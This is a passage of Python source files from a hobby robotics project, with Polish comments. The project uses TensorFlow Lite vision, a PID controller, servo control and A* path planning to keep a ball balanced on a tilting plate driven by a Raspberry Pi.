            movement_dir = MM.sign(self.servo_target_pos[i] - self.servo_actual_pos[i])
            self.servo_actual_pos[i] += ServoController.servo_movement_speed[i] * movement_dir * deltaTime
            
            if movement_dir > 0: self.servo_actual_pos[i] = min(self.servo_actual_pos[i], self.servo_target_pos[i])
            elif movement_dir < 0: self.servo_actual_pos[i] = max(self.servo_actual_pos[i], self.servo_target_pos[i])
                
            if not simulationMode:
                pos = round(ServoController.servo_pulse_neutral[i] + ServoController.servo_pulse_range[i] * self.servo_actual_pos[i] / 1000)
                self.pwm.set_pwm(i, 0, pos)
            else:
                self.servo_actual_pos[i] = round(self.servo_actual_pos[i])
/n/n/nPythonCode/TensorflowProcessingModule.py/n/nimport numpy as np

print(""Importing Tensorflow libraries"")
from tensorflow.contrib.lite.python import interpreter as interpreter_wrapper
import tensorflow as tf

#klasa z funkcjami do przetwarzania danych sieciami neuronowymi z Tensorflow
class TensorflowProcessor:
    
    #sciezka do uzywanego modelu
    ball_detector_model_path = ""/home/pi/ballance/Ballance/Tensorflow/ballancenet_conv_3_quant.tflite""
    corner_detector_model_path = ""/home/pi/ballance/Ballance/Tensorflow/ballancenet_boardcorner_conv_2.5_quant.tflite""
    
    #funkcja generujaca zoptymalizowany model
    def QuantizeModel(model_path, output_file_name):
        print(""Quantizing model"")
        converter = tf.contrib.lite.TocoConverter.from_saved_model(model_path)
        converter.post_training_quantize = True
        quant_model = converter.convert()
        open(output_file_name + "".tflite"", ""wb"").write(quant_model)
        
    def __init__(self):
        print(""Creating TensorflowProcessor object"")
        #wczytywanie modelu do wykrywania kulki
        print(""Loading ball detection tflite model"")
        self.ball_detector_interpreter = interpreter_wrapper.Interpreter(model_path=TensorflowProcessor.ball_detector_model_path)
        self.ball_detector_interpreter.allocate_tensors()
        self.ball_detector_input_details = self.ball_detector_interpreter.get_input_details()
        self.ball_detector_output_details = self.ball_detector_interpreter.get_output_details()
        
        #wczytywanie modelu do wykrywania krawedzi plyty
        print(""Loading corner detection tflite model"")
        self.corner_detector_interpreter = interpreter_wrapper.Interpreter(model_path=TensorflowProcessor.corner_detector_model_path)
        self.corner_detector_interpreter.allocate_tensors()
        self.corner_detector_input_details = self.corner_detector_interpreter.get_input_details()
        self.corner_detector_output_details = self.corner_detector_interpreter.get_output_details()
        
        print(""TensorflowProcessor object created"")
        
    def getBallPosition(self, image):
        #przygotowanie obrazu
        image = np.float32(image)
        image /= 255.0
        image = np.expand_dims(image, axis=0)
        image = np.expand_dims(image, axis=3)
        
        #wykonanie interpretacji
        self.ball_detector_interpreter.set_tensor(self.ball_detector_input_details[0]['index'], image)
        self.ball_detector_interpreter.invoke()
        
        return np.squeeze(self.ball_detector_interpreter.get_tensor(self.ball_detector_output_details[0]['index']))
    
    def getCornerPosition(self, image):
        #przygotowanie obrazu
        image = np.float32(image)
        image /= 255.0
        image = np.expand_dims(image, axis=0)
        image = np.expand_dims(image, axis=3)
        
        #wykonanie interpretacji
        self.corner_detector_interpreter.set_tensor(self.corner_detector_input_details[0]['index'], image)
        self.corner_detector_interpreter.invoke()
        
        return np.squeeze(self.corner_detector_interpreter.get_tensor(self.corner_detector_output_details[0]['index']))/n/n/nPythonCode/test.py/n/nimport TensorflowProcessingModule as TPM

TPM.TensorflowProcessor.QuantizeModel(""/home/pi/ballance/ballance_net/ballancenet_boardcorner_conv2.5"", ""ballancenet_boardcorner_conv_2.5_quant"")/n/n/n",0
143,da22d46baf8362ce33dd89c8d5ac834632fc4e0f,"/PythonCode/Ballance.py/n/nif __name__ == '__main__':
    simulationMode = True    #czy uruchomic program w trybie symulacji? wymaga rowniez zmiany w ServoControllerModule.py oraz w ImageProcessingModule.py

    import ImageProcessingModule as IPM
    import ServoControllerModule as SCM
    import PIDControllerModule as PIDCM
    import DataLoggerModule as DLM
    import PathPlannerModule as PPM
    
    from time import sleep
    import time
    import pygame
    import math
    import MathModule as MM

    #wykonanie wstepnych czynnosci
    if simulationMode:
        import SimulationCommunicatorModule as SimCM
        simulationCommunicator = SimCM.SimulationCommunicator()
    else: simulationCommunicator = None
    
    imageProcessor = IPM.ImageProcessor(simulationCommunicator)
    servoController = SCM.ServoController()
    pathPlanner = PPM.PathPlanner()
        
    dataLogger = DLM.DataLogger()
    pidController = PIDCM.PIDController()
    pidController.servo_pos_limit = servoController.servo_pos_limit

    pygame.init()
    pygame.display.set_mode((100, 100))

    #roizpoczynanie procesu wykrywania kulki
    if simulationMode: simulationCommunicator.StartProcessing()
    imageProcessor.StartProcessing()
    pathPlanner.startProcessing(imageProcessor.obstacle_map)

    targetDeltaTime = 1.0 / 40.0    #czas jednej iteracji programu sterujacego
    updatedTime = 0.0
    servoUpdateDeltaTime = 1.0 / 60 #czas odswiezania pozycji serw
    servoUpdatedTime = 0.0

    ball_position_actual = (0.0, 0.0)
    ball_position_previous = (0.0, 0.0)

    #parametry trajektorii kulki
    angle = 0.0
    angleSpeed = 0.9
    angleRadius = 0.25
    angleRadiusFactor = 0.0
    path_targets = [(0.18, 0.18), (0.82, 0.82)]
    path_target_index = 0
    targetPos = path_targets[path_target_index]
    moveSpeed = 0.05
    movementMode = 0
    modeChangeTimeDelta = 25 #czas po jakim zmieniana jest trajektoria kulki
    modeChangeTimer = 0.0

    #jak dlugo wykonywany ma byc program
    duration = 10000
    timeout = time.time() + duration
    ball_just_found = True    #czy kulka dopiero zostala znaleziona i nalezy zresetowac predkosc?

    #glowna petla programu
    while time.time() <= timeout:
        timeStart = time.perf_counter()
        
        #oczekiwanie na odpowiedni moment do wykonania programu sterujacego
        if timeStart - updatedTime >= targetDeltaTime:
            updatedTime = time.perf_counter()
            
            #pobranie pozycji kulki
            ball_position_actual = imageProcessor.getBallPosition()
            if ball_position_actual[0] >= 0: pidController.setActualValue(ball_position_actual)
            else: pidController.setActualValue(pidController.value_target)
                
            #aktualizacja kontrolera PID
            pidController.update(targetDeltaTime)
            ball_position_previous = ball_position_actual
            
            #aktualizacja pozycji kulki w pathplannerze
            pathPlanner.setBallPosition(ball_position_actual)
            pidController.setTargetValue(pathPlanner.getPathTarget())
            
            #przechodzenie do kolejnego waypoint'a
            if MM.sqrMagnitude(ball_position_actual[0] - targetPos[0], ball_position_actual[1] - targetPos[1]) < 0.01:
                path_target_index = (path_target_index + 1) % len(path_targets)
                targetPos = path_targets[path_target_index]
                pathPlanner.setTargetPosition(targetPos)
            #print(str(pidController.value_target))
            
            #obslugiwanie wejscia z klawiatury
            killLoop = False
            for event in pygame.event.get():
                if event.type == pygame.KEYDOWN:
                    if event.key == pygame.K_g:
                        pidController.increaseKP()
                        
                    elif event.key == pygame.K_b:
                        pidController.decreaseKP()
                        
                    elif event.key == pygame.K_h:
                        pidController.increaseKI()
                        
                    elif event.key == pygame.K_n:
                        pidController.decreaseKI()
                        
                    elif event.key == pygame.K_j:
                        pidController.increaseKD()
                        
                    elif event.key == pygame.K_m:
                        pidController.decreaseKD()
                        
                    elif event.key == pygame.K_q:
                        killLoop = True
                        
                    elif event.key == pygame.K_UP:
                        targetPos[1] -= moveSpeed
                        
                    elif event.key == pygame.K_DOWN:
                        targetPos[1] += moveSpeed
                        
                    elif event.key == pygame.K_RIGHT:
                        targetPos[0] += moveSpeed
                        
                    elif event.key == pygame.K_LEFT:
                        targetPos[0] -= moveSpeed
                        
                    elif event.key == pygame.K_p:
                        angleSpeed += 0.1
                        print(""angleSpeed = "" + str(angleSpeed))
                        
                    elif event.key == pygame.K_o:
                        angleSpeed -= 0.1
                        print(""angleSpeed = "" + str(angleSpeed))
                        
            if killLoop:
                break
            
            #ustawianie nowych pozycji serw
            servoController.moveServo(0, round(pidController.x_servo))
            servoController.moveServo(1, -round(pidController.y_servo))
            
            #dostepne trajektorie ruchu kulki
            if False:
                if movementMode == 0:    #ksztalt osemki
                    targetPos[0] = math.sin(angle)
                    targetPos[1] = math.sin(2.0 * angle)
                elif movementMode == 1:  #ksztalt okregu
                    targetPos[0] = math.sin(angle)
                    targetPos[1] = math.cos(angle)
                elif movementMode == 2:   #ksztalt paraboli
                    targetPos[0] = math.sin(angle)
                    targetPos[1] = math.cos(2.0 * angle)
                elif movementMode == 3:   #ksztalt litery S
                    targetPos[0] = math.sin(angle)
                    targetPos[1] = math.sin(2.0 * angle)
                    if angle > 2:
                        angleSpeed = -angleSpeed
                        angle = 2
                    elif angle < -2:
                        angleSpeed = -angleSpeed
                        angle = -2
                    
            #targetPos[0] = 0.5 + angleRadiusFactor * angleRadius * targetPos[0]
            #targetPos[1] = 0.5 + angleRadiusFactor * angleRadius * targetPos[1]
            #ustawianie docelowej pozycji kulki
            #pidController.setTargetValue(targetPos[0], targetPos[1])
            #pathPlanner.setTargetPosition(tuple(targetPos))
            angle += angleSpeed * targetDeltaTime
            angleRadiusFactor += 0.25 * targetDeltaTime
            angleRadiusFactor = min(angleRadiusFactor, 1.0)
            
            modeChangeTimer += targetDeltaTime
            if modeChangeTimer >= modeChangeTimeDelta:
                modeChangeTimer = 0.0
                angleRadiusFactor = 0.0
                movementMode += 1
                movementMode = movementMode % 4
            
            #dodawanie wpisow do DataLog'u
            if False:
                path_target = pathPlanner.getPathTarget()
                dataLogger.addRecord(""timestamp"", time.perf_counter())
                dataLogger.addRecord(""ball_pos_x"", ball_position_actual[0])
                dataLogger.addRecord(""ball_pos_y"", ball_position_actual[1])
                dataLogger.addRecord(""target_pos_x"", path_target[0])
                dataLogger.addRecord(""target_pos_y"", path_target[1])
                dataLogger.addRecord(""KP"", pidController.KP)
                dataLogger.addRecord(""KI"", pidController.KI)
                dataLogger.addRecord(""KD"", pidController.KD)
                dataLogger.addRecord(""error_x"", pidController.x_error)
                dataLogger.addRecord(""error_y"", pidController.y_error)
                dataLogger.addRecord(""error_prev_x"", pidController.x_prev_error)
                dataLogger.addRecord(""error_prev_y"", pidController.y_prev_error)
                dataLogger.addRecord(""error_sum_x"", pidController.x_error_sum)
                dataLogger.addRecord(""error_sum_y"", pidController.y_error_sum)
                dataLogger.addRecord(""derivative_x"", pidController.x_derivative)
                dataLogger.addRecord(""derivative_y"", pidController.y_derivative)
                dataLogger.addRecord(""servo_actual_x"", servoController.servo_actual_pos[0])
                dataLogger.addRecord(""servo_actual_y"", servoController.servo_actual_pos[1])
                dataLogger.addRecord(""servo_target_x"", servoController.servo_target_pos[0])
                dataLogger.addRecord(""servo_target_y"", servoController.servo_target_pos[1])
                dataLogger.saveRecord()
            
        #oczekiwanie na odpowiedni moment do aktualizacji serw
        if time.perf_counter() - servoUpdatedTime >= servoUpdateDeltaTime:
            servoController.update(time.perf_counter() - servoUpdatedTime)
            servoUpdatedTime = time.perf_counter()
            
            if simulationMode:
                simulationCommunicator.moveServos(servoController.servo_actual_pos)
                
        sleep(0.004) #4 milisekundy na odpoczynek :)
            
    print(""Stopping program"")
    #dataLogger.saveToFile(""BallanceDataLog"")
    if simulationMode: simulationCommunicator.StopProcessing()
    else: imageProcessor.StopProcessing()
    pathPlanner.stopProcessing()/n/n/n/PythonCode/ImageProcessingModule.py/n/nsimulationMode = True

if not simulationMode:
    import TensorflowProcessingModule as TPM
    from imutils.video.pivideostream import PiVideoStream

import MathModule as MM
import math, time, copy
import cv2
import numpy as np
from multiprocessing import Process, RawValue, RawArray
 
#program sluzacy do analizy obrazu z kamery, wykrywania kulki
class ImageProcessor:
    
    #parametry kamery
    camera_resolution = (256, 256)
    camera_framerate = 40
    
    corner_detecton_area = (0.08, 0.08, 0.14, 0.14) #prostakat, w ktorym szukana jest krawedz plyty, jest on powielany dla kazdego rogu obrazu
    detection_image_resolution = (200, 200)
    detection_image_resolution_cropped = (-1, -1)
    
    #rozmiar bitmapy przeszkod
    obstacle_map_size = 40
    obstacle_map_update_delta = 40
        
    def __init__(self, _simulationCommunicator=None):
        print(""ImageProcessor object created"")
        self.simulationCommunicator = _simulationCommunicator
        #wartosci-rezultaty przetwarzania obrazu
        self.result_x = RawValue('f', 0.0)
        self.result_y = RawValue('f', 0.0)
        self.key = RawValue('i', 0)
        
        self.obstacle_map = RawArray('i', ImageProcessor.obstacle_map_size**2)
        self.obstacle_map_update_counter = 0
        
    def getBallPosition(self):    #zwraca pozycje kulki
        if simulationMode: return self.simulationCommunicator.getBallPosition()
        return (self.result_x.value, self.result_y.value)
        
    def StartProcessing(self):   #uruchamia proces przetwarzajacy obraz
        print(""Starting image processing"")
        
        self.process = Process(target=ImageProcessor.ProcessImage, args=(self,))
        self.process.daemon = True
        self.process.start()
        #ImageProcessor.ProcessImage(self)
        
    def StopProcessing(self):    #wydaje polecenie do zatrzymania przetwarzania obrazu
        print(""Stopping image processing"")
        self.key.value = -666
        self.process.terminate()
        
    def ProcessImage(self):    #przetwarza obraz pobierajac klatke z kamery i wykonujac na niej operacje analizy
        
        #bufor dzielenia mapy przeszkod z innymi procesami
        self.obstacle_map_np = np.frombuffer(self.obstacle_map, dtype=np.int32).reshape(ImageProcessor.obstacle_map_size**2)
        
        #parametry trackera kulki
        self.ballTracker_pos = [ImageProcessor.detection_image_resolution[0]//2, ImageProcessor.detection_image_resolution[1]//2]
        self.ballTracker_size = 40
        self.ballTracker_result = [0, 0]
        
        if not simulationMode:
            self.tensorflowProcessor = TPM.TensorflowProcessor()
            videoStream = PiVideoStream(resolution=ImageProcessor.camera_resolution, framerate=ImageProcessor.camera_framerate).start()   #uruchamianie watku, ktory czyta kolejne klatki z kamery
        else:
            videoStream = self.simulationCommunicator
        
        time.sleep(1)
        self.frame_original = videoStream.read()
        
        lastTime = time.time()
        a = 190
        lastID = 0
        
        saveCounter = 0
        saveCount = 0
        
        while True:
            if self.key.value == -666: break
            
            #prosty licznik przetworzonych klatek w ciagu sekundy
            a = a + 1
            if a > 200:
                if ImageProcessor.detection_image_resolution_cropped[0] == -1:
                    ImageProcessor.detection_image_resolution_cropped = (np.size(self.frame_original, 0), np.size(self.frame_original, 1))
                print(str(a * 1.0 / (time.time() - lastTime)))
                lastTime = time.time()
                a = 0
            
            #synchronizacja pobierania nowej klatki z czestotliwascia kamery
            while True:
                frameGrabbed = videoStream.read()
                ID = id(frameGrabbed)
                if ID != lastID:
                    self.frame_original = frameGrabbed
                    lastID = ID
                    break
                elif not simulationMode:
                    time.sleep(0.01)
            
            #klatka przeznaczona do debugowania
            #self.frame_debug = copy.copy(self.frame_original)
            
            if not simulationMode: self.corners = ImageProcessor.FindBoardCorners(self)    #znajdowanie pozycji rogow plyty
            else: self.corners = self.simulationCommunicator.FindBoardCorners()
            ImageProcessor.ChangePerspective(self)    #zmiana perspektywy znalezionej tablicy, aby wygladala jak kwadrat
            #self.frame_original = self.frame_original[1:200, 1:200] #przycinanie zdjecia
            if not simulationMode: ImageProcessor.UpdateBallTracker(self)    #aktualizacja trackera kulki
            else:
                pos = self.simulationCommunicator.getBallPosition()
                self.ballTracker_result[0] = pos[0] * ImageProcessor.detection_image_resolution_cropped[0]
                self.ballTracker_result[1] = pos[1] * ImageProcessor.detection_image_resolution_cropped[1]
            ImageProcessor.UpdateObstacleMap(self)
            
            #ustawianie znalezionej pozycji kulki w zmiennych dzielonych miedzy procesami
            self.result_x.value = self.ballTracker_result[0] / ImageProcessor.detection_image_resolution_cropped[0]
            self.result_y.value = self.ballTracker_result[1] / ImageProcessor.detection_image_resolution_cropped[1]
            
            #cv2.imshow(""Frame debug"", self.frame_debug)
            if saveCounter < saveCount:
                cv2.imwrite(""Frame"" + str(saveCounter) + "".png"", self.frame_original)
                saveCounter += 1
                
            #cv2.imshow(""Frame Casted"", self.frame_original)
            #key = cv2.waitKey(1) & 0xFF
            #if key == ord(""q""):
            #    break
            
        videoStream.stop()
            
    #aktualizuje tracker kulki
    def UpdateBallTracker(self):
        self.ballTracker_pos[0] = MM.clamp(self.ballTracker_pos[0], 0, ImageProcessor.detection_image_resolution_cropped[0] - self.ballTracker_size)
        self.ballTracker_pos[1] = MM.clamp(self.ballTracker_pos[1], 0, ImageProcessor.detection_image_resolution_cropped[1] - self.ballTracker_size)
        
        self.ballTracker_pos[0] = int(self.ballTracker_pos[0])
        self.ballTracker_pos[1] = int(self.ballTracker_pos[1])
        
        #przygotowanie klatki z kamery do analizy
        tracker_frame = self.frame_original[self.ballTracker_pos[1]:self.ballTracker_pos[1]+self.ballTracker_size,
                                            self.ballTracker_pos[0]:self.ballTracker_pos[0]+self.ballTracker_size]
        tracker_frame = cv2.cvtColor(tracker_frame, cv2.COLOR_BGR2GRAY)
        
        #analiza klatki z uzyciem sieci neuronowych
        result = self.tensorflowProcessor.getBallPosition(tracker_frame)
        result = np.round(result * self.ballTracker_size).astype(""int"")
        
        self.ballTracker_result[0] = self.ballTracker_pos[0] + result[0]
        self.ballTracker_result[1] = self.ballTracker_pos[1] + result[1]
        
        #zaznaczanie wizualne pozycji kulki
        cv2.circle(self.frame_original, tuple(self.ballTracker_result), 1, (0, 0, 255), -1)
        
        #aktualizacja pozycji trackera
        self.ballTracker_pos[0] = MM.lerp(self.ballTracker_pos[0], self.ballTracker_result[0] - self.ballTracker_size // 2, 0.7)
        self.ballTracker_pos[1] = MM.lerp(self.ballTracker_pos[1], self.ballTracker_result[1] - self.ballTracker_size // 2, 0.7)
    
    #znajduje pozycje krawedzi plyty
    def FindBoardCorners(self):
        corners = np.zeros((4, 2), dtype=np.int32)
        corner_detection_area_pixels = [round(self.corner_detecton_area[0] * self.camera_resolution[0]),
                                       round(self.corner_detecton_area[1] * self.camera_resolution[1]),
                                       round(self.corner_detecton_area[2] * self.camera_resolution[0]),
                                       round(self.corner_detecton_area[3] * self.camera_resolution[1])]
        for i in range(4):
            flipX = False
            flipY = False
            detectionArea = copy.copy(corner_detection_area_pixels)    #domyslnie lewy gorny
            if i == 1 or i == 2:
                detectionArea[0] = self.camera_resolution[0] - detectionArea[0] - detectionArea[2]
                flipX = True
            if i == 3 or i == 2:
                detectionArea[1] = self.camera_resolution[1] - detectionArea[1] - detectionArea[3]
                flipY = True
                
            rect = (detectionArea[0], detectionArea[1], detectionArea[0] + detectionArea[2], detectionArea[1] + detectionArea[3])
            #cv2.rectangle(self.frame_debug, (rect[0], rect[1]), (rect[2], rect[3]), (0, 255, 0), 1);
        
            img = self.frame_original[rect[1]:rect[3], rect[0]:rect[2]]
            img = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
            img = cv2.resize(img, (40, 40), interpolation=cv2.INTER_NEAREST)
            
            if flipX and flipY: img = cv2.flip(img, -1)
            elif flipX: img = cv2.flip(img, 1)
            elif flipY: img = cv2.flip(img, 0)
            #cv2.imshow(""Corner "" + str(i), img)
            
            result = self.tensorflowProcessor.getCornerPosition(img)
            corner = np.round(result * 40.0).astype(""int"")
            
            if flipX and flipY: corners[i] = (40 - corner[0] + detectionArea[0], 40 - corner[1] + detectionArea[1])
            elif flipX: corners[i] = (40 - corner[0] + detectionArea[0], corner[1] + detectionArea[1])
            elif flipY: corners[i] = (corner[0] + detectionArea[0], 40 - corner[1] + detectionArea[1])
            else: corners[i] = (corner[0] + detectionArea[0], corner[1] + detectionArea[1])
            #cv2.circle(self.frame_debug, corners[i], 1, (0, 0, 255), 1)

        return corners

    #zmienia perspektywe obrazu z kamery tak, aby niewidoczne bylo przechylenie plyty
    def ChangePerspective(self):
        pts = np.array(self.corners, np.float32)
        res = self.detection_image_resolution
        pts2 = np.float32([[0,0],[res[0],0],[res[0], res[1]], [0, res[1]]])

        M = cv2.getPerspectiveTransform(pts, pts2)
        self.frame_original = cv2.warpPerspective(self.frame_original, M, res)
        
    #aktualizuje mape przeszkod na plycie
    def UpdateObstacleMap(self):
        self.obstacle_map_update_counter += 1
        if self.obstacle_map_update_counter >= ImageProcessor.obstacle_map_update_delta:
            self.obstacle_map_update_counter = 0
            frame = cv2.resize(self.frame_original, (ImageProcessor.obstacle_map_size, ImageProcessor.obstacle_map_size), interpolation=cv2.INTER_NEAREST)
            frame = np.int32(frame)
            frame = 2 * frame[...,2] - frame[...,1] - frame[...,0]
            np.copyto(self.obstacle_map_np, frame.ravel())
            #self.obstacle_map = frame[...,2].ravel()/n/n/n/PythonCode/PIDControllerModule.py/n/nimport MathModule as MM

class PIDController:
    
    #operacje zmiany pidow
    def increaseKP(self):
        self.KP += 50
        print(""KP = "" + str(self.KP))
        
    def increaseKI(self):
        self.KI += 50
        print(""KI = "" + str(self.KI))
        
    def increaseKD(self):
        self.KD += 50
        print(""KD = "" + str(self.KD))
        
    def decreaseKP(self):
        self.KP -= 50
        print(""KP = "" + str(self.KP))
        
    def decreaseKI(self):
        self.KI -= 50
        print(""KI = "" + str(self.KI))
        
    def decreaseKD(self):
        self.KD -= 50
        print(""KD = "" + str(self.KD))
        
    #ustawia aktualna wartosc
    def setActualValue(self, x, y=None):
        if y is not None:
            self.value_actual[0] = MM.lerp(self.value_actual[0], x, self.value_smoothing)
            self.value_actual[1] = MM.lerp(self.value_actual[1], y, self.value_smoothing)
        else:
            self.value_actual[0] = MM.lerp(self.value_actual[0], x[0], self.value_smoothing)
            self.value_actual[1] = MM.lerp(self.value_actual[1], x[1], self.value_smoothing)
        
    #ustawia docelowa wartosc
    def setTargetValue(self, x, y=None):
        if y is not None:
            self.value_target[0] = x
            self.value_target[1] = y
        else:
            self.value_target[0] = x[0]
            self.value_target[1] = x[1]
    
    def __init__(self):
        self.servo_pos_limit = (1000, 1000)    #ograniczenia wychylen serw (w skali od 0 do 1000)
        self.value_target = [0.5, 0.5]    #docelowa wartosc, ktora ma byc osiagnieta przez kontroler
        self.value_actual = [0.5, 0.5]    #aktualna wartosc
        self.value_smoothing = 1.0       #wspolczynnik wygladzania aktualizacji aktualnej wartosci

        #wspolczynniki kontroli
        self.KP = 1.3 * 1000   #wzmocnienie czesci proporcjonalnej
        self.KI = 0.6 * 1000    #wzmocnienie czesci calkujacej
        self.KD = 0.5 * 1000   #wzmocnienie czesci rozniczkujacej

        #pozycja serwa
        self.x_servo = 0.0
        self.y_servo = 0.0

        #wartosc bledu
        self.x_error = 0.0
        self.y_error = 0.0

        #wartosci poprzednich bledow
        self.x_prev_error = 0.0
        self.y_prev_error = 0.0

        #zmiana bledu w czasie
        self.x_derivative = 0.0
        self.y_derivative = 0.0

        #calkowita suma bledow
        self.x_error_sum = 0.0
        self.y_error_sum = 0.0

    #aktualizuje kontrolea PID
    def update(self, deltaTime):
        #liczenie bledu
        self.x_error = self.value_target[0] - self.value_actual[0]
        self.y_error = self.value_target[1] - self.value_actual[1]
        
        #print(""Error = ( "" + str(self.x_error) + ""; "" + str(self.y_error) + "")"")

        #liczenie pochodnej
        self.x_derivative = (self.x_error - self.x_prev_error) / deltaTime
        self.y_derivative = (self.y_error - self.y_prev_error) / deltaTime

        self.x_prev_error = self.x_error
        self.y_prev_error = self.y_error

        self.x_error_sum += self.x_error * deltaTime
        self.y_error_sum += self.y_error * deltaTime
        
        #zmiana pozycji serw z uwzglednieniem bledu biezacego, przyszlego oraz przeszlego
        self.x_servo = (self.x_error * self.KP) + (self.x_derivative * self.KD) + (self.x_error_sum * self.KI)
        self.y_servo = (self.y_error * self.KP) + (self.y_derivative * self.KD) + (self.y_error_sum * self.KI)
        
        self.x_servo = MM.clamp(self.x_servo, -self.servo_pos_limit[0], self.servo_pos_limit[0])
        self.y_servo = MM.clamp(self.y_servo, -self.servo_pos_limit[1], self.servo_pos_limit[1])
        
        self.x_error_sum = MM.clamp(self.x_error_sum, -1.0, 1.0) * 0.99
        self.y_error_sum = MM.clamp(self.y_error_sum, -1.0, 1.0) * 0.99/n/n/n/PythonCode/PathPlannerModule.py/n/nimport cv2
import numpy as np
import MathModule as MM
import time
from multiprocessing import Process, RawValue
from collections import deque
import copy

#program odpowiadajacy za planiwanie sciezki kulki
class PathPlanner:
    
    obstacle_map_size = 40    #rozmiar mapy przeszkod
    obstacle_map_update_delta = 4    #co ile sekund odswiezana ma byc mapa przeszkod?
    path_sub_update_delta = 0.1    #co ile sekund aktualizowac podsciezke?
    
    def __init__(self):
        print(""PathPlanner object created"")
        
        self.obstacle_map = None
        self.path = None
        self_path_last_index = 0
        self.proximity_map = np.zeros((PathPlanner.obstacle_map_size, PathPlanner.obstacle_map_size)) #tablica 2D z kosztem bliskosci wykrytych przeszkod
        
        self.path_position = 0.0   #aktualna pozycja na sciezce
        self.path_speed = 0.2 * PathPlanner.obstacle_map_size    #predkosc przechodzenia sciezki
        
        self.ball_pos_x = RawValue('f', 0.5)
        self.ball_pos_y = RawValue('f', 0.5)
        self.target_pos_x = RawValue('f', 0.25)
        self.target_pos_y = RawValue('f', 0.25)
        self.path_x = RawValue('f', 0.5)
        self.path_y = RawValue('f', 0.5)
        
    def setBallPosition(self, pos):
        self.ball_pos_x.value = pos[1]
        self.ball_pos_y.value = pos[0]
        
    def setTargetPosition(self, pos):
        self.target_pos_x.value = pos[1]
        self.target_pos_y.value = pos[0]
        
    def getPathTarget(self):
        return (self.path_x.value, self.path_y.value)
        
    def startProcessing(self, _frame_array):
        print(""Starting PathPlanner process"")
        self.process = Process(target=PathPlanner.doPlanning, args=(self,_frame_array))
        self.process.daemon = True
        self.process.start()
        
    def stopProcessing(self):
        print(""Stopping PathPlanner process"")
        self.process.terminate()
        
    def doPlanning(self, _frame_array):
        obstacle_map_update_time = 0.0
        path_sub_update_time = 0.0
        while True:
            if time.perf_counter() - obstacle_map_update_time >= PathPlanner.obstacle_map_update_delta:
                obstacle_map_update_time = time.perf_counter()
                PathPlanner.updateObstacleMap(self, _frame_array)
                
            if time.perf_counter() - path_sub_update_time >= PathPlanner.path_sub_update_delta:
                path_sub_update_time = time.perf_counter()
                PathPlanner.UpdateSubPath(self)
        
    #aktualizuje bitmape przeszkod
    def updateObstacleMap(self, _frame_array):
        frame = np.frombuffer(_frame_array, dtype=np.int32)
        frame = np.clip(frame, 0, 255).astype('uint8').reshape((PathPlanner.obstacle_map_size, PathPlanner.obstacle_map_size))
        #cv2.imshow(""Map"", frame)
        frame = cv2.inRange(frame, 90, 255)
        #kernel = np.ones((2,2), np.uint8)
        #frame = cv2.dilate(frame, kernel, iterations=1)
        self.obstacle_map = frame
        
        #aktualizacja mapy bliskosci przeszkod
        self.proximity_map.fill(0)
        size = PathPlanner.obstacle_map_size - 1
        sides = ((1, 0), (1, -1), (0, -1), (-1, -1), (-1, 0), (-1, 1), (0, 1), (1, 1))
        for x in range(1, size):
            for y in range(1, size):
                if frame[x, y] > 0:
                    for side in sides:
                        self.proximity_map[x + side[0], y + side[1]] += 1
        
        #np.clip(self.proximity_map, 0, 1, self.proximity_map)
        self.proximity_map *= 5000
        
        #aktualizacja glownej sciezki
        start = PathPlanner.FromUnitaryToMapSpace((self.ball_pos_x.value, self.ball_pos_y.value), self.obstacle_map_size)
        end = PathPlanner.FromUnitaryToMapSpace((self.target_pos_x.value, self.target_pos_y.value), self.obstacle_map_size)
        self.path = PathPlanner.a_star(self, start, end)
        
        self.path_last_index = len(self.path)-1
        self.path_position = 0.0
        
    #aktualizuje podsciezke przy uzyciu algorytmu A*
    def UpdateSubPath(self):
        if self.path == None: return None
        
        ball_pos = (self.ball_pos_x.value, self.ball_pos_y.value)
        path = self.path
        
        index = int(self.path_position)
        A = PathPlanner.FromMapToUnitarySpace(path[index])
        
        frame = copy.copy(self.obstacle_map)
        frame = cv2.cvtColor(frame, cv2.COLOR_GRAY2BGR)
        
        if self.path_last_index > 0:
            B = PathPlanner.FromMapToUnitarySpace(path[index+1])
            dist = MM.distance(A, B)
            mant = self.path_position - index
            
            PathPlanner.PaintRay(self, PathPlanner.FromUnitaryToMapSpace(ball_pos, self.obstacle_map_size), path[index+1], frame)
            if not PathPlanner.Raycast(self, PathPlanner.FromUnitaryToMapSpace(ball_pos, self.obstacle_map_size), path[index+1]):
                print(""False"")
                self.path_position += self.path_speed * PathPlanner.path_sub_update_delta / (dist * PathPlanner.obstacle_map_size)
            if self.path_position >= self.path_last_index: self.path_position = self.path_last_index - 0.00001
            
            target_y = MM.lerp(A[0], B[0], mant)
            target_x = MM.lerp(A[1], B[1], mant)
        else:
            target_y = A[0]
            target_x = A[1]
            
        #print(target_x)
        #print(target_y)
        #print("""")
        
        self.path_x.value = target_x
        self.path_y.value = target_y
            
        
        
        #DEBUG
        for p in path:
            if PathPlanner.isPointWithinMap(self, p):
                frame[p[0], p[1]] = [255, 255, 0]
            
        frame = cv2.resize(frame, (200, 200), interpolation=cv2.INTER_NEAREST)
        
        cv2.imshow(""PathPlanner frame"", frame)
        key = cv2.waitKey(1) & 0xFF
        
    #zmienia uklad odniesienia z mapy przeszkod na jednostkowy
    def FromMapToUnitarySpace(point):
        return (point[0] / PathPlanner.obstacle_map_size, point[1] / PathPlanner.obstacle_map_size)
    
    #zmienia uklad odniesienia z jednostkowego na mape przeszkod
    def FromUnitaryToMapSpace(point, size):
        return (round(point[0] * size), round(point[1] * size))
        
    #sprawdza, czy punkt wewnatrz mapy przeszkod
    def isPointWithinMap(self, point):
        size = self.obstacle_map_size
        return point[0] >= 0 and point[0] < size and point[1] >= 0 and point[1] < size
        
    #algorytm A* wyznaczajacy sciezke z punktu A do B
    def a_star(self, A, B):
        start = B
        end = A
        #movement = ((1, 0), (-1, 0), (0, 1), (0, -1))
        movement = ((1, 0), (-1, 0), (0, 1), (0, -1), (-1, -1), (-1, 1), (1, 1), (1, -1))
        
        que = MM.PriorityQueue()
        que.push(start, 0)
        
        visited_from = {}
        cost = {}
        
        visited_from[start] = None
        visited_from[end] = None
        cost[start] = 0
        
        #timeStart = time.perf_counter()
        while not que.empty():
            v = que.pop()
            if v == end: break
            
            new_cost = cost[v] + 1
            i = 0
            for move in movement:
                nx = v[0] + move[0]
                ny = v[1] + move[1]
                
                i += 1
                if i == 5: new_cost += 0.4
                
                if PathPlanner.isPointWithinMap(self, (nx, ny)) and self.obstacle_map[nx, ny] == 0:
                    u = (nx, ny)
